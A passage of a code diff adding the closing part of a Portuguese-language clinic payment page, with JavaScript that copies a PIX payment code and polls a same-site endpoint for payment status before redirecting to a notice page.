+                        clinicInfoEl.style.display = 'block';
+                    }
+                }
+            } catch (error) {
+                console.error('Erro ao carregar clínica:', error);
+            }
+        }
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCodeInput');
+            pixCode.select();
+            pixCode.setSelectionRange(0, 99999); // For mobile devices
+            navigator.clipboard.writeText(pixCode.value);
+            
+            // Change button text temporarily
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = 'Copiado!';
+            button.style.backgroundColor = '#10B981';
+            button.style.color = 'white';
+            
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.style.backgroundColor = '#044785';
+                button.style.color = 'white';
+            }, 2000);
+        }
+
+        // Payment monitoring system
+        window.currentTransactionId = null;
+        window.paymentMonitor = null;
+        
+        function startPaymentStatusCheck() {
+            // SEMPRE usar o ID mais recente criado
+            let transactionId = window.currentTransactionId;
+            
+            // If not available from template, try other sources
+            if (!transactionId || transactionId === 'None') {
+                const urlParams = new URLSearchParams(window.location.search);
+                transactionId = urlParams.get('transaction_id') || 
+                              sessionStorage.getItem('transactionId') || 
+                              localStorage.getItem('transactionId') ||
+                              localStorage.getItem('paymentId');
+                
+                // Also check if there's a payment data object in localStorage
+                if (!transactionId) {
+                    try {
+                        const paymentData = JSON.parse(localStorage.getItem('payment_data') || '{}');
+                        transactionId = paymentData.id || paymentData.transactionId;
+                    } catch (e) {
+                        console.log('Error parsing payment data from localStorage');
+                    }
+                }
+                
+                // Check for current payment ID in localStorage
+                if (!transactionId) {
+                    transactionId = localStorage.getItem('currentPaymentId');
+                }
+                
+                // Check if we have a global PIX payment ID from the page
+                if (!transactionId && window.currentPixPaymentId) {
+                    transactionId = window.currentPixPaymentId;
+                    console.log('Using global PIX payment ID:', transactionId);
+                }
+            }
+            
+            if (!transactionId || transactionId === 'None') {
+                console.log('No transaction ID found for status checking - retrying in 2 seconds...');
+                setTimeout(() => {
+                    startPaymentStatusCheck();
+                }, 2000);
+                return;
+            }
+            
+            console.log('Starting automatic payment status check for transaction:', transactionId);
+            
+            // Clear any existing intervals first
+            if (window.statusCheckInterval) {
+                clearInterval(window.statusCheckInterval);
+            }
+            
+            // Check payment status every 500ms for INSTANT redirection
+            window.statusCheckInterval = setInterval(() => {
+                checkPaymentStatus(transactionId);
+            }, 500);
+            
+            // Initial check
+            checkPaymentStatus(transactionId);
+        }
+        
+        function checkPaymentStatus(transactionId) {
+            fetch(`/check_payment_status/${transactionId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Payment status check result:', data);
+                    
+                    if (data.success && data.redirect) {
+                        console.log('PIX APROVADO - REDIRECIONANDO AGORA!');
+                        
+                        // Parar TODAS as verificações
+                        clearInterval(window.activePaymentCheck);
+                        clearInterval(window.statusCheckInterval);
+                        clearInterval(window.currentStatusInterval);
+                        
+                        // REDIRECIONAMENTO INSTANTÂNEO
+                        console.log('Redirecionando para /aviso...');
+                        window.location.href = '/aviso';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking payment status:', error);
+                });
+        }
+        
+        // Start automatic payment checking when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load clinic and appointment information first
+            loadClinicAndAppointmentInfo();
+            
+            // Also populate the clinic info inside payment boxes
+            populateClinicInfoInBoxes();
+            
+            // Start checking immediately for fastest redirection
+            setTimeout(() => {
+                startPaymentStatusCheck();
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
